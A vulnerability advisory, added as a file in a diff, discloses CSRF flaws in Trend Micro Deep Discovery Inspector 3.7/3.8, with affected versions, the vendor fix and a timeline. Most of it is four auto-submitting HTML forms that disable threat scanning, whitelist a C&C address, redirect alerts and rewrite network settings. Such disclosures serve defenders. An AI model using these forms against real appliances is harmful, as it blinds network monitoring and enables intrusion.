@@ -1,0 +1,360 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/TRENDMICRO-DDI-CSRF.txt
+
+
+Vendor:
+====================
+www.trendmicro.com
+
+
+Product:
+=========================================
+Trend Micro Deep Discovery Inspector
+V3.8, 3.7
+
+Deep Discovery Inspector is a network appliance that gives you 360-degree
+network monitoring of all traffic
+to detect all aspects of a targeted attack.
+
+
+Vulnerability Type:
+================================
+Cross Site Request Forgery - CSRF
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+================================
+
+Trend Micro Deep Discovery suffers from multiple CSRF vectors, if an
+authenticated user visits an malicious webpage attackers will
+have ability to modify many settings of the Deep Discovery application to
+that of the attackers choosing.
+
+
+Reference:
+http://esupport.trendmicro.com/solution/en-US/1113708.aspx
+
+Trend Micro DDI is affected by CSRF vulnerabilities. These affect the
+following console features:
+
+Deny List Notifications
+Detection Rules
+Threat Detections
+Email Settings
+Network
+Blacklisting/Whitelisting
+Time
+Accounts
+Power Off / Restart
+DETAILS
+The following DDI versions prior to version 3.8 Service Pack 2 (SP2) are
+affected:
+
+3.8 English
+3.8 Japanese
+3.7 English
+3.7 Japanese
+3.7 Simplified Chinese
+Trend Micro has released DDI 3.8 SP2. All versions up to version 3.8 SP1
+must upgrade to version 3.8 SP2 (Build 3.82.1133) to address this issue.
+
+
+Exploit code(s):
+===============
+
+
+1) Shut down all threat scans and malicious file submissions under:
+ Administration /Monitoring / Scanning / Threat Detections
+
+<iframe id="demonica" name="demonica"></iframe>
+
+<form id="CSRF-ThreatScans" target="demonica" action="
+https://localhost/php/scan_options.php" method="post">
+<input type="hidden" name="act" value="set" />
+<input type="hidden" name="enable_all" value="0" />
+<input type="hidden" name="enable_vsapi" value="1" />
+<input type="hidden" name="enable_marsd" value="1" />
+<input type="hidden" name="enable_ops" value="1" />
+<input type="hidden" name="enable_block" value="0" />
+<input type="hidden" name="enable_feedback" value="0" />
+<input type="hidden" name="enable_send_suspicious_file" value="0" />
+<script>document.getElementById('CSRF-ThreatScans').submit()</script>
+</form>
+
+
+2) Whitelist C&C server menu location:  Detections / C&C Callback Addresses
+
+ <form id="CSRF-Whitelist" target="demonica" action="
+https://localhost/php/blacklist_whitelist_query.php" method="post">
+<input type="hidden" name="black_or_white" value="ccca" />
+<input type="hidden" name="action" value="move_to_white_ccca" />
+<input type="hidden" name="delete_list" value='"list":[{"name":"
+http://bad.place.com/","list_type":"3"}]}"' />
+<input type="hidden" name="comments" value="TEST" />
+<script>document.getElementById('CSRF-Whitelist').submit()</script>
+</form>
+
+
+3) Turn off or change email notifications
+
+<form id="CSRF-Notifications" target="demonica" action="
+https://localhost/cgi-bin/mailSettings_set.cgi" method="post">
+<input type="hidden" name="adm_email_address" value="punksnotdead@hell.com"
+/>
+<input type="hidden" name="sender_address" value="punksnotdead@hell.com" />
+<input type="hidden" name="mail_server" value="x.x.x.x" />
+<input type="hidden" name="mail_server_port" value="25" />
+<input type="hidden" name="showusername" value="" />
+<input type="hidden" name="showpassword" value="" />
+<input type="hidden" name="max_notification_per_hour" value="5" />
+<input type="hidden" name="check_mail_queue" value="60" />
+<input type="hidden" name="server" value="x.x.x.x" />
+<input type="hidden" name="port" value="25" />
+<input type="hidden" name="admin_address" value="" />
+<input type="hidden" name="from_address" value="PWNED@PWNED.com" />
+<input type="hidden" name="username" value="" />
+<input type="hidden" name="password" value="" />
+<input type="hidden" name="freq_limit_interval" value="3600" />
+<input type="hidden" name="freq_limit_softlimit" value="5" />
+<input type="hidden" name="testconnect" value="config" />
+<input type="hidden" name="which_cgi_flag" value="" />
+<input type="hidden" name="alert_message" value="" />
+<input type="hidden" name="save_status" value="false" />
+<script>document.getElementById('CSRF-Notifications').submit()</script>
+</form>
+
+4) Change system settings ( x.x.x.x = whatever IP we want )
+
+<form id='PWNED' target="demonica" action="
+https://localhost/cgi-bin/admin_ip.cgi" method="post">
+<input type="hidden" name="txtHostname" value="localhost" />
+<input type="hidden" name="radioType" value="radiobutton" />
+<input type="hidden" name="txtIP" value="x.x.x.x" />
+<input type="hidden" name="txtNetmask" value="255.255.0.0" />
+<input type="hidden" name="txtGateway" value="x.x.x.x" />
+<input type="hidden" name="txtDNS1" value="x.x.x.x" />
+<input type="hidden" name="txtDNS2" value="x.x.x.x" />
+<input type="hidden" name="txtIP_ip6" value="" />
+<input type="hidden" name="txtIP_ip6_prefix" value="" />
+<input type="hidden" name="txtGateway_ip6" value="" />
+<input type="hidden" name="txtDNS1_ip6" value="" />
+<input type="hidden" name="td_start" value="Start" />
+<input type="hidden" name="td_start" value="Start" />
+<input type="hidden" name="td_analyze" value="View" />
+<input type="hidden" name="td_export" value="Export" />
+<input type="hidden" name="td_reset" value="Reset" />
+<input type="hidden" name="button1112" value="Cancel" />
+<input type="hidden" name="network_type" value="static" />
+<input type="hidden" name="act" value="save" />
+<input type="hidden" name="Hostname" value="localhost" />
+<input type="hidden" name="IP" value="x.x.x.x" />
+<input type="hidden" name="Netmask" value="255.255.0.0" />
+<input type="hidden" name="Gateway" value="x.x.x.x" />
+<input type="hidden" name="DNS1" value="x.x.x.x" />
+<input type="hidden" name="DNS2" value="x.x.x.x" />
+<input type="hidden" name="enable_ip6" value="no" />
+<input type="hidden" name="network_type_ip6" value="static" />
+<input type="hidden" name="IP_ip6" value="" />
+<input type="hidden" name="IP_ip6_prefix" value="" />
+<input type="hidden" name="Gateway_ip6" value="" />
+<input type="hidden" name="DNS1_ip6" value="" />
+<input type="hidden" name="port1_nic" value="eth0" />
+<input type="hidden" name="port1_type" value="auto" />
+<input type="hidden" name="port1_speed" value="" />
+<input type="hidden" name="port1_duplex" value="" />
+<input type="hidden" name="port1_attr" value="MGMT" />
+<input type="hidden" name="port1_cap"
+value="auto%3A10H%3A10F%3A100H%3A100F%3A1000F" />
+<input type="hidden" name="port1_state" value="1000" />
+<input type="hidden" name="port2_nic" value="eth1" />
+<input type="hidden" name="port2_type" value="auto" />
+<input type="hidden" name="port2_speed" value="" />
+<input type="hidden" name="port2_duplex" value="" />
+<input type="hidden" name="port2_attr" value="INT" />
+<input type="hidden" name="port2_cap"
+value="auto%3A10H%3A10F%3A100H%3A100F%3A1000F" />
+<input type="hidden" name="port2_state" value="1000" />
+<input type="hidden" name="port3_nic" value="eth2" />
+<input type="hidden" name="port3_type" value="auto" />
+<input type="hidden" name="port3_speed" value="" />
+<input type="hidden" name="port3_duplex" value="" />
+<input type="hidden" name="port3_attr" value="INT" />
+<input type="hidden" name="port3_cap"
+value="auto%3A10H%3A10F%3A100H%3A100F%3A1000F" />
+<input type="hidden" name="port3_state" value="1000" />
+<input type="hidden" name="port4_nic" value="eth3" />
+<input type="hidden" name="port4_type" value="auto" />
+<input type="hidden" name="port4_speed" value="" />
+<input type="hidden" name="port4_duplex" value="" />
+<input type="hidden" name="port4_attr" value="INT" />
+<input type="hidden" name="port4_cap"
+value="auto%3A10H%3A10F%3A100H%3A100F%3A1000F" />
+<input type="hidden" name="port4_state" value="-1" />
+<input type="hidden" name="port5_nic" value="eth4" />
+<input type="hidden" name="port5_type" value="auto" />
+<input type="hidden" name="port5_speed" value="" />
+<input type="hidden" name="port5_duplex" value="" />
+<input type="hidden" name="port5_attr" value="INT" />
+<input type="hidden" name="port5_cap"
+value="auto%3A10H%3A10F%3A100H%3A100F%3A1000F" />
+<input type="hidden" name="port5_state" value="-1" />
+<input type="hidden" name="port6_nic" value="eth5" />
+<input type="hidden" name="port6_type" value="auto" />
+<input type="hidden" name="port6_speed" value="" />
+<input type="hidden" name="port6_duplex" value="" />
+<input type="hidden" name="port6_attr" value="INT" />
+<input type="hidden" name="port6_cap"
+value="auto%3A10H%3A10F%3A100H%3A100F%3A1000F" />
+<input type="hidden" name="port6_state" value="-1" />
+<input type="hidden" name="port7_nic" value="eth6" />
+<input type="hidden" name="port7_type" value="manual" />
+<input type="hidden" name="port7_speed" value="10000" />
+<input type="hidden" name="port7_duplex" value="full" />
+<input type="hidden" name="port7_attr" value="INT" />
+<input type="hidden" name="port7_cap" value="10000F" />
+<input type="hidden" name="port7_state" value="-1" />
+<input type="hidden" name="port8_nic" value="eth7" />
+<input type="hidden" name="port8_type" value="manual" />
+<input type="hidden" name="port8_speed" value="10000" />
+<input type="hidden" name="port8_duplex" value="full" />
+<input type="hidden" name="port8_attr" value="INT" />
+<input type="hidden" name="port8_cap" value="10000F" />
+<input type="hidden" name="port8_state" value="-1" />
+<input type="hidden" name="port9_nic" value="ext3" />
+<input type="hidden" name="port9_type" value="auto" />
+<input type="hidden" name="port9_speed" value="" />
+<input type="hidden" name="port9_duplex" value="" />
+<input type="hidden" name="port9_attr" value="N%2FA" />
+<input type="hidden" name="port9_cap" value="" />
+<input type="hidden" name="port9_state" value="" />
+<input type="hidden" name="port10_nic" value="ext4" />
+<input type="hidden" name="port10_type" value="auto" />
+<input type="hidden" name="port10_speed" value="" />
+<input type="hidden" name="port10_duplex" value="" />
+<input type="hidden" name="port10_attr" value="N%2FA" />
+<input type="hidden" name="port10_cap" value="" />
+<input type="hidden" name="port10_state" value="" />
+<input type="hidden" name="port11_nic" value="ext5" />
+<input type="hidden" name="port11_type" value="auto" />
+<input type="hidden" name="port11_speed" value="" />
+<input type="hidden" name="port11_duplex" value="" />
+<input type="hidden" name="port11_attr" value="N%2FA" />
+<input type="hidden" name="port11_cap" value="" />
+<input type="hidden" name="port11_state" value="" />
+<input type="hidden" name="port12_nic" value="ext6" />
+<input type="hidden" name="port12_type" value="auto" />
+<input type="hidden" name="port12_speed" value="" />
+<input type="hidden" name="port12_duplex" value="" />
+<input type="hidden" name="port12_attr" value="N%2FA" />
+<input type="hidden" name="port12_cap" value="" />
+<input type="hidden" name="port12_state" value="" />
+<input type="hidden" name="port13_nic" value="ext7" />
+<input type="hidden" name="port13_type" value="auto" />
+<input type="hidden" name="port13_speed" value="" />
+<input type="hidden" name="port13_duplex" value="" />
+<input type="hidden" name="port13_attr" value="N%2FA" />
+<input type="hidden" name="port13_cap" value="" />
+<input type="hidden" name="port13_state" value="" />
+<input type="hidden" name="port14_nic" value="ext8" />
+<input type="hidden" name="port14_type" value="auto" />
+<input type="hidden" name="port14_speed" value="" />
+<input type="hidden" name="port14_duplex" value="" />
+<input type="hidden" name="port14_attr" value="N%2FA" />
+<input type="hidden" name="port14_cap" value="" />
+<input type="hidden" name="port14_state" value="" />
+<input type="hidden" name="port15_nic" value="ext9" />
+<input type="hidden" name="port15_type" value="auto" />
+<input type="hidden" name="port15_speed" value="" />
+<input type="hidden" name="port15_duplex" value="" />
+<input type="hidden" name="port15_attr" value="N%2FA" />
+<input type="hidden" name="port15_cap" value="" />
+<input type="hidden" name="port15_state" value="" />
+<input type="hidden" name="port16_nic" value="ext10" />
+<input type="hidden" name="port16_type" value="auto" />
+<input type="hidden" name="port16_speed" value="" />
+<input type="hidden" name="port16_duplex" value="" />
+<input type="hidden" name="port16_attr" value="N%2FA" />
+<input type="hidden" name="port16_cap" value="" />
+<input type="hidden" name="port16_state" value="" />
+<input type="hidden" name="port17_nic" value="ext11" />
+<input type="hidden" name="port17_type" value="auto" />
+<input type="hidden" name="port17_speed" value="" />
+<input type="hidden" name="port17_duplex" value="" />
+<input type="hidden" name="port17_attr" value="N%2FA" />
+<input type="hidden" name="port17_cap" value="" />
+<input type="hidden" name="port17_state" value="" />
+<input type="hidden" name="port18_nic" value="ext12" />
+<input type="hidden" name="port18_type" value="auto" />
+<input type="hidden" name="port18_speed" value="" />
+<input type="hidden" name="port18_duplex" value="" />
+<input type="hidden" name="port18_attr" value="N%2FA" />
+<input type="hidden" name="port18_cap" value="" />
+<input type="hidden" name="port18_state" value="" />
+<input type="hidden" name="port19_nic" value="ext13" />
+<input type="hidden" name="port19_type" value="auto" />
+<input type="hidden" name="port19_speed" value="" />
+<input type="hidden" name="port19_duplex" value="" />
+<input type="hidden" name="port19_attr" value="N%2FA" />
+<input type="hidden" name="port19_cap" value="" />
+<input type="hidden" name="port19_state" value="" />
+<input type="hidden" name="port20_nic" value="ext14" />
+<input type="hidden" name="port20_type" value="auto" />
+<input type="hidden" name="port20_speed" value="" />
+<input type="hidden" name="port20_duplex" value="" />
+<input type="hidden" name="port20_attr" value="N%2FA" />
+<input type="hidden" name="port20_cap" value="" />
+<input type="hidden" name="port20_state" value="" />
+<input type="hidden" name="tcpdump" value="" />
+<input type="hidden" name="interface" value="" />
+<input type="hidden" name="vlan_enable" value="0" />
+<script>document.getElementById('PWNED').submit()</script>
+</form>
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification:  November 23, 2015
+March 25, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+========================================================================
+
+Request Method(s):        [+] POST
+
+
+Vulnerable Product:       [+] Trend Micro Deep Discovery Inspector V3.8
+
+
+========================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
